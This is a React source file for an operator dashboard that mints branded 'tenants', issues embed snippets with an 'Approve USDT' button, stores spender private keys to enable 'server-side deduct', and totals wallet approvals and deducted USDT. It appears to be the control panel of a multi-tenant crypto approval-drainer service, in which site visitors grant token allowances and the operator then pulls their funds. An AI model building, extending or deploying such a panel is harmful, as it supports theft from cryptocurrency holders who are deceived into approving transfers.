import { useCallback, useEffect, useMemo, useState, type FormEvent } from 'react'
import './dash.css'
import './platform.css'

const TOKEN_KEY = 'platform.token'
const ADDRESS_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/

type Counters = {
  connects: number
  approvals: number
  revokes: number
  deductions: number
  deductedRaw: string
  failed: number
}

type Tenant = {
  id: string
  name: string
  createdAt: string
  spender: string
  allowedOrigins: string[]
  branding: { name: string; description: string; url: string | null }
  counters: Counters
  hasKey: boolean
}

type Created = { key: string; snippet: string; name: string }

async function api<T>(token: string, path: string, init?: RequestInit): Promise<T> {
  const res = await fetch(`/api/platform${path}`, {
    ...init,
    headers: {
      'content-type': 'application/json',
      authorization: `Bearer ${token}`,
      ...(init?.headers ?? {}),
    },
  })

  const text = await res.text()
  let data: { error?: string } | null = null
  try {
    data = text ? JSON.parse(text) : null
  } catch {
    data = null
  }

  if (!res.ok) throw new Error(data?.error ?? `Request failed (${res.status})`)
  return data as T
}

function usdt(raw: string): string {
  try {
    return (Number(BigInt(raw || '0')) / 1_000_000).toLocaleString(undefined, {
      maximumFractionDigits: 2,
    })
  } catch {
    return '0'
  }
}

function short(value: string, head = 6, tail = 6): string {
  return value.length <= head + tail + 3 ? value : `${value.slice(0, head)}…${value.slice(-tail)}`
}

async function copy(text: string): Promise<boolean> {
  try {
    await navigator.clipboard.writeText(text)
    return true
  } catch {
    const el = document.createElement('textarea')
    el.value = text
    el.style.position = 'fixed'
    el.style.opacity = '0'
    document.body.appendChild(el)
    el.select()
    const ok = document.execCommand('copy')
    document.body.removeChild(el)
    return ok
  }
}

export default function Platform() {
  const [token, setToken] = useState('')
  const [authed, setAuthed] = useState(false)
  const [loading, setLoading] = useState(false)
  const [tenants, setTenants] = useState<Tenant[]>([])
  const [error, setError] = useState<string | null>(null)
  const [notice, setNotice] = useState<string | null>(null)
  const [created, setCreated] = useState<Created | null>(null)
  const [busy, setBusy] = useState<string | null>(null)

  const [name, setName] = useState('')
  const [spender, setSpender] = useState('')
  const [spenderKey, setSpenderKey] = useState('')
  const [origins, setOrigins] = useState('')

  const load = useCallback(async (active: string) => {
    setLoading(true)
    setError(null)
    try {
      const data = await api<{ tenants: Tenant[] }>(active, '/tenants')
      setTenants(data.tenants)
      setAuthed(true)
      sessionStorage.setItem(TOKEN_KEY, active)
    } catch (err) {
      const message = err instanceof Error ? err.message : 'Request failed'
      if (/unauthorized|401/i.test(message)) {
        setAuthed(false)
        sessionStorage.removeItem(TOKEN_KEY)
        setError('Token rejected.')
      } else {
        setError(message)
      }
    } finally {
      setLoading(false)
    }
  }, [])

  useEffect(() => {
    const stored = sessionStorage.getItem(TOKEN_KEY)
    if (!stored) return
    setToken(stored)
    void load(stored)
  }, [load])

  const totals = useMemo(() => {
    let deducted = 0
    let approvals = 0
    let connects = 0
    for (const tenant of tenants) {
      deducted += Number(BigInt(tenant.counters.deductedRaw || '0')) / 1_000_000
      approvals += tenant.counters.approvals
      connects += tenant.counters.connects
    }
    return { deducted, approvals, connects }
  }, [tenants])

  async function signIn(event: FormEvent) {
    event.preventDefault()
    const value = token.trim()
    if (!value) return
    await load(value)
  }

  function signOut() {
    sessionStorage.removeItem(TOKEN_KEY)
    setToken('')
    setAuthed(false)
    setTenants([])
    setCreated(null)
  }

  async function mint(event: FormEvent) {
    event.preventDefault()
    setError(null)
    setNotice(null)
    setCreated(null)

    const cleanName = name.trim()
    const cleanSpender = spender.trim()

    if (cleanName.length < 2 || cleanName.length > 40) {
      setError('Name must be 2-40 characters.')
      return
    }
    if (!ADDRESS_RE.test(cleanSpender)) {
      setError('Spender must be a base58 Tron address starting with T.')
      return
    }
    const cleanKey = spenderKey.trim().replace(/^0x/i, '').toLowerCase()
    if (cleanKey && !/^[0-9a-f]{64}$/.test(cleanKey)) {
      setError('Private key must be 64 hex characters.')
      return
    }

    setBusy('create')
    try {
      const data = await api<{ tenant: Tenant; key: string; snippet: string }>(token, '/tenants', {
        method: 'POST',
        body: JSON.stringify({
          name: cleanName,
          spender: cleanSpender,
          spenderKey: cleanKey || undefined,
          allowedOrigins: origins
            .split(/[\s,]+/)
            .map((value) => value.trim())
            .filter(Boolean),
        }),
      })

      setCreated({ key: data.key, snippet: data.snippet, name: data.tenant.name })
      setName('')
      setSpender('')
      setSpenderKey('')
      setOrigins('')
      await load(token)
      setNotice(`Created ${data.tenant.name}. The key below is shown once.`)
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Could not create tenant')
    } finally {
      setBusy(null)
    }
  }

  async function rotate(tenant: Tenant) {
    if (!window.confirm(`Rotate the key for ${tenant.name}? The old key dies immediately.`)) return
    setError(null)
    setNotice(null)
    setBusy(tenant.id)
    try {
      const data = await api<{ key: string }>(token, `/tenants/${tenant.id}/rotate`, {
        method: 'POST',
      })
      setCreated({
        key: data.key,
        snippet: `<script src="${location.origin}/embed.js" data-tenant="${tenant.id}" data-label="Approve USDT"></script>`,
        name: tenant.name,
      })
      setNotice(`New key for ${tenant.name}. Copy it now.`)
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Rotate failed')
    } finally {
      setBusy(null)
    }
  }

  async function remove(tenant: Tenant) {
    if (!window.confirm(`Delete ${tenant.name}? The panel, key and counters go with it.`)) return
    setError(null)
    setNotice(null)
    setBusy(tenant.id)
    try {
      await api(token, `/tenants/${tenant.id}`, { method: 'DELETE' })
      setCreated(null)
      await load(token)
      setNotice(`Deleted ${tenant.name}.`)
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Delete failed')
    } finally {
      setBusy(null)
    }
  }

  if (!authed) {
    return (
      <div className="pf-shell pf-center">
        <form className="pf-card pf-login" onSubmit={signIn}>
          <div className="pf-brand">
            <span className="pf-dot" />
            <span>Platform</span>
          </div>
          <h1>Operator access</h1>
          <p className="pf-muted">
            Paste the <code>PLATFORM_TOKEN</code> to mint tenants, rotate keys and read totals.
          </p>
          <label className="pf-field">
            <span>Token</span>
            <input
              type="password"
              value={token}
              onChange={(event) => setToken(event.target.value)}
              placeholder="PLATFORM_TOKEN"
              autoComplete="off"
              spellCheck={false}
            />
          </label>
          {error && <p className="pf-error">{error}</p>}
          <button className="pf-btn pf-btn-primary" type="submit" disabled={loading || !token.trim()}>
            {loading ? 'Checking…' : 'Unlock'}
          </button>
        </form>
      </div>
    )
  }

  return (
    <div className="pf-shell">
      <header className="pf-top">
        <div className="pf-brand">
          <span className="pf-dot" />
          <span>Platform</span>
        </div>
        <div className="pf-top-actions">
          <button className="pf-btn pf-btn-ghost" onClick={() => void load(token)} disabled={loading}>
            {loading ? 'Refreshing…' : 'Refresh'}
          </button>
          <button className="pf-btn pf-btn-ghost" onClick={signOut}>
            Lock
          </button>
        </div>
      </header>

      <main className="pf-main">
        <section className="pf-stats">
          <div className="pf-stat">
            <span>Tenants</span>
            <strong>{tenants.length}</strong>
          </div>
          <div className="pf-stat">
            <span>Total deducted</span>
            <strong>{totals.deducted.toLocaleString(undefined, { maximumFractionDigits: 2 })} USDT</strong>
          </div>
          <div className="pf-stat">
            <span>Approvals</span>
            <strong>{totals.approvals.toLocaleString()}</strong>
          </div>
          <div className="pf-stat">
            <span>Connects</span>
            <strong>{totals.connects.toLocaleString()}</strong>
          </div>
        </section>

        {error && <p className="pf-error pf-banner">{error}</p>}
        {notice && <p className="pf-notice pf-banner">{notice}</p>}

        {created && (
          <section className="pf-card pf-reveal">
            <div className="pf-reveal-head">
              <h2>Credentials for {created.name}</h2>
              <button className="pf-btn pf-btn-ghost" onClick={() => setCreated(null)}>
                Dismiss
              </button>
            </div>
            <p className="pf-warn">Shown once. Only the hash is stored — there is no recovery.</p>

            <label className="pf-field">
              <span>Login key</span>
              <div className="pf-copy-row">
                <input readOnly value={created.key} onFocus={(event) => event.currentTarget.select()} />
                <button
                  className="pf-btn pf-btn-ghost"
                  type="button"
                  onClick={async () => {
                    const ok = await copy(created.key)
                    setNotice(ok ? 'Key copied.' : 'Copy blocked — select it manually.')
                  }}
                >
                  Copy
                </button>
              </div>
            </label>

            <label className="pf-field">
              <span>Embed snippet</span>
              <div className="pf-copy-row">
                <input readOnly value={created.snippet} onFocus={(event) => event.currentTarget.select()} />
                <button
                  className="pf-btn pf-btn-ghost"
                  type="button"
                  onClick={async () => {
                    const ok = await copy(created.snippet)
                    setNotice(ok ? 'Snippet copied.' : 'Copy blocked — select it manually.')
                  }}
                >
                  Copy
                </button>
              </div>
            </label>
          </section>
        )}

        <section className="pf-card">
          <h2>New tenant</h2>
          <form className="pf-form" onSubmit={mint}>
            <label className="pf-field">
              <span>Name</span>
              <input
                value={name}
                onChange={(event) => setName(event.target.value)}
                placeholder="Acme Trading"
                maxLength={40}
              />
            </label>
            <label className="pf-field">
              <span>Payout / spender address</span>
              <input
                value={spender}
                onChange={(event) => setSpender(event.target.value)}
                placeholder="TP44oh…"
                spellCheck={false}
              />
            </label>
            <label className="pf-field">
              <span>Spender private key (optional)</span>
              <input
                type="password"
                value={spenderKey}
                onChange={(event) => setSpenderKey(event.target.value)}
                placeholder="64 hex — enables server-side deduct"
                spellCheck={false}
                autoComplete="off"
              />
            </label>
            <label className="pf-field">
              <span>Allowed origins (optional)</span>
              <input
                value={origins}
                onChange={(event) => setOrigins(event.target.value)}
                placeholder="https://acme.com, https://app.acme.com"
                spellCheck={false}
              />
            </label>
            <button className="pf-btn pf-btn-primary" type="submit" disabled={busy === 'create'}>
              {busy === 'create' ? 'Creating…' : 'Create tenant'}
            </button>
          </form>
        </section>

        <section className="pf-card">
          <div className="pf-reveal-head">
            <h2>Tenants</h2>
            <span className="pf-muted">{tenants.length} total</span>
          </div>

          {tenants.length === 0 && !loading && (
            <p className="pf-muted">Nothing yet. Mint the first tenant above.</p>
          )}

          {tenants.length > 0 && (
            <div className="pf-table-wrap">
              <table className="pf-table">
                <thead>
                  <tr>
                    <th>Name</th>
                    <th>Spender</th>
                    <th>Deducted</th>
                    <th>Activity</th>
                    <th>Deduct key</th>
                    <th>Created</th>
                    <th />
                  </tr>
                </thead>
                <tbody>
                  {tenants.map((tenant) => (
                    <tr key={tenant.id}>
                      <td>
                        <a className="pf-link" href={`/t/${tenant.id}`} target="_blank" rel="noreferrer">
                          {tenant.name}
                        </a>
                        <div className="pf-mono pf-muted">{tenant.id}</div>
                      </td>
                      <td className="pf-mono" title={tenant.spender}>
                        {short(tenant.spender)}
                      </td>
                      <td>{usdt(tenant.counters.deductedRaw)} USDT</td>
                      <td className="pf-muted">
                        {tenant.counters.approvals} appr · {tenant.counters.connects} conn ·{' '}
                        {tenant.counters.failed} fail
                      </td>
                      <td>
                        <span className={tenant.hasKey ? 'pf-pill pf-pill-on' : 'pf-pill'}>
                          {tenant.hasKey ? 'yes' : 'no'}
                        </span>
                      </td>
                      <td className="pf-muted">{new Date(tenant.createdAt).toLocaleDateString()}</td>
                      <td className="pf-row-actions">
                        <button
                          className="pf-btn pf-btn-ghost"
                          onClick={() => void rotate(tenant)}
                          disabled={busy === tenant.id}
                        >
                          Rotate
                        </button>
                        <button
                          className="pf-btn pf-btn-danger"
                          onClick={() => void remove(tenant)}
                          disabled={busy === tenant.id}
                        >
                          Delete
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </section>
      </main>
    </div>
  )
}
